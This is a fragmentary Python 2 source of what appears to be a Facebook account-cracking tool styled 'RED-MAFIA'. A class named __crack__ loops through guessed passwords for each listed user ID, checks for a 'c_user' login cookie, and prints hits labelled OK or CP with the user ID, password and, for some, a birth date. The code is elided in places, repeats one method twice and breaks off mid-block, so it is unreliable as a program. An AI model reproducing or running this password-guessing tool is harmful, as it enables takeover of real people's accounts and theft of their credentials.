...
def main():
    os.system('clear')
    print logo
    print '\x1b[1;97m[RED-MAFIA] MAIN MENU'
    print '\x1b[1;97m------------------------------------------------'
    print '\x1b[1;91m [1]\x1b[1;97m  FILE CLONING     \x1b[1;92m[LOGIN]'
    print '\x1b[1;97m------------------------------------------------'
    log_sel()
...
class __crack__:
    ...
    def plerr(self):
        ...
        ___yayanganteng___ = raw_input(' [%sY%s] Are You Went To Continue :  ' % (O, N))
    ...
    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\R[%s\x1b[1;92mE\xe2\x99\xa1D%s] [MAFIA] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                ...
                print '\r%s[RK-OK]    %s     | %s   %s' % (H, user, pw, N)
                ...
                try:
                    ...
                    print '\r%s[RK-CP]   %s   | %s | %s %s %s %s' % (K, user, pw, day, month, year, N)
                ...
                print '\r%s[RK-CP]    %s     | %s %s' % (K, user, pw, N)
    ...
    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\RED[%s\x1b[1;92m\xe2\x99\xa1%s] [MAFIA] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
